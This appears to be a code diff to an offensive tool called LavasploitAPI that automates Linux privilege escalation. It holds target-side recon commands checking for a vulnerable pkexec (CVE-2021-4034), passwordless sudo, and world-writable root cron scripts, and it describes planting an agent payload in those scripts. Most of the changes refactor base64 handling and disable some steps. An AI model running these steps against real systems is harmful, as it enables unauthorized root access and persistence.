@@ -51,8 +51,8 @@ class LavasploitAPI:
         command = '''
         if [ `command -v pkexec` ] && stat -c '%a' $(which pkexec) | grep -q 4755 && [ "$(stat -c '%Y' $(which pkexec))" -lt "1642035600" ]; then echo "True"; else echo "False"; fi
         '''
-        result = await self.send_command_and_retrieve_result(command)
-        is_vulnerable = str(base64.b64decode(result), 'utf-8').strip("\n\r")
+        is_vulnerable = await self.send_command_and_retrieve_result(command)
+        #is_vulnerable = str(base64.b64decode(result), 'utf-8').strip("\n\r")
         if is_vulnerable == "True":
             self.current_command_name = 'Exploit CVE-2021-4034'
             self.current_command_description = 'Exploit CVE-2021-4034 with prepared payload'
@@ -67,8 +67,8 @@ class LavasploitAPI:
         self.current_command_name = 'Reconn for sudo privileges'
         self.current_command_description = 'Reconn for available sudo privileges for current user without password'
         command = '''timeout 1 sudo -l | grep NOPASSWD | awk -F " " '{print $5}' '''
-        result = await self.send_command_and_retrieve_result(command)
-        current_user_privilege = str(base64.b64decode(result), 'utf-8').strip("\n\r")
+        current_user_privilege = await self.send_command_and_retrieve_result(command)
+        #current_user_privilege = str(base64.b64decode(result), 'utf-8').strip("\n\r")
         if current_user_privilege == 'ALL':
             self.current_command_name = 'Execute payload as Root'
             self.current_command_description = 'Utilize the sudo privilege to execute payload as root'
@@ -81,8 +81,8 @@ class LavasploitAPI:
         reconn_command = '''
         file=$(cat /etc/crontab | grep root | grep -v "cron" | awk -F " " '{print $7}'); for f in $file; do find $f -perm -o=w 2>/dev/null; done
         '''
-        result = await self.send_command_and_retrieve_result(reconn_command)
-        writable_file = str(base64.b64decode(result), 'utf-8').strip("\n\r").split()
+        writable_file = (await self.send_command_and_retrieve_result(reconn_command)).split()
+        #writable_file = str(base64.b64decode(result), 'utf-8').strip("\n\r").split()
         for file in writable_file:
             self.current_command_name = 'Insert Payload into crontab jobs'
             self.current_command_description = 'insert out agent payload into listed writable file with file lock'
@@ -95,10 +95,10 @@ class LavasploitAPI:
     async def run_auto_priv_esc(self, request):
         await self.update_target_info(request)
 
-        await self.generate_agent_payload()
-        await self.attempt_cve_2021_4034()
+        #await self.generate_agent_payload()
+        #await self.attempt_cve_2021_4034()
 
-        await self.attempt_crontab()
+        #await self.attempt_crontab()
         await self.attempt_Sudo()
 
         return web.json_response('auto PE completed')
@@ -149,7 +149,7 @@ class LavasploitAPI:
                 await asyncio.sleep(10)
                 timeout_count -= 1
                 result = 'Fetch Result Failed'
-        return result
+        return str(base64.b64decode(result), 'utf-8').strip("\n\r")
 
     async def exploit(self, request):
         if 'internal_identifier' in request:
